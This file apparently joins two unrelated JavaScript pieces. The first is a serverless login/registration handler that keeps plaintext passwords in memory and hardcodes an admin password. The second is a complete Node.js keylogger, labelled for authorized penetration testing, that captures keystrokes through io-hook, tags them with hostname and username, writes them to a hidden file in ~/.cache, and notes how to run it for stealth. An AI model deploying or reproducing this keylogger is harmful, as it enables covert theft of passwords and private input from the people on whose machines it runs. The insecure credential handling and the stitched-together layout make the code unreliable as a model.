// Temporary memory to store users
const users = [
    { username: 'admin', password: 'securePassword123' }
];

// CHANGED: Using module.exports instead of export default for Vercel compatibility
module.exports = function(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }
    
    const { action, username, password } = req.body;

    // --- LOGIN LOGIC ---
    if (action === 'login') {
        const foundUser = users.find(u => u.username === username && u.password === password);
        
        if (foundUser) {
            return res.status(200).json({ 
                success: true, 
                message: 'Login successful' 
            });
        } else {
            return res.status(401).json({ 
                success: false, 
                message: 'Access Denied. Invalid credentials.' 
            });
        }
    }
    
    // --- REGISTRATION LOGIC ---
    if (action === 'register') {
        if (password.length >= 6) {
            const userExists = users.find(u => u.username === username);
            if (userExists) {
                return res.status(400).json({ 
                    success: false, 
                    message: 'Registration Failed: Username is already taken!' 
                });
            }

            users.push({ username: username, password: password });
            return res.status(200).json({ 
                success: true, 
                message: 'Account created successfully! You can now switch to Log In.' 
            });
        } else {
            return res.status(400).json({ 
                success: false, 
                message: 'Registration Failed: Password must be at least 6 characters.' 
            });
        }
    }

    return res.status(400).json({ success: false, message: 'Invalid action requested.' });
};
#!/usr/bin/env node
/**
 * Node.js Keylogger — Authorized Penetration Testing Only
 * Requires: npm install io-hook
 * Works on Linux (evdev) and Windows.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');

const LOG_PATH = path.join(os.homedir(), '.cache', 'js-keys.log');
const INTERVAL = 5000; // flush interval (ms)

// Ensure log directory exists
fs.mkdirSync(path.dirname(LOG_PATH), { recursive: true });

let buffer = [];

function writeLog(entry) {
    const line = JSON.stringify({
        ts: new Date().toISOString(),
        hostname: os.hostname(),
        user: os.userInfo().username,
        ...entry
    }) + '\n';
    fs.appendFileSync(LOG_PATH, line);
    console.log(`[+] Logged: ${line.trim()}`); // remove console.log for stealth
}

try {
    const io = require('io-hook');
    let currentLine = '';

    io.on('keydown', function(key) {
        const specialKeys = {
            28: '\n',   // Enter
            15: '\t',   // Tab
            57: ' ',    // Space
            14: '[BS]', // Backspace
            1:  '[ESC]'
        };

        let char;
        if (key in specialKeys) {
            char = specialKeys[key];
        } else {
            char = String.fromCharCode(key).toLowerCase();
        }

        if (char === '\n') {
            currentLine += '\n';
            writeLog({ keystrokes: btoa(currentLine) });
            currentLine = '';
        } else {
            currentLine += char;
        }
    });

    console.log(`[+] Keylogger running — logging to ${LOG_PATH}`);
    console.log('[+] Press Ctrl+C to stop.');

    // Keep alive
    process.stdin.resume();

    // Clean shutdown
    process.on('SIGINT', () => {
        if (currentLine) {
            writeLog({ keystrokes: btoa(currentLine) });
        }
        io.stop();
        process.exit(0);
    });

} catch (err) {
    console.error('[!] io-hook not available. Install with: npm install io-hook');
    console.error('[!] On Linux, run as root or grant read access to /dev/input/*');
    process.exit(1);
}
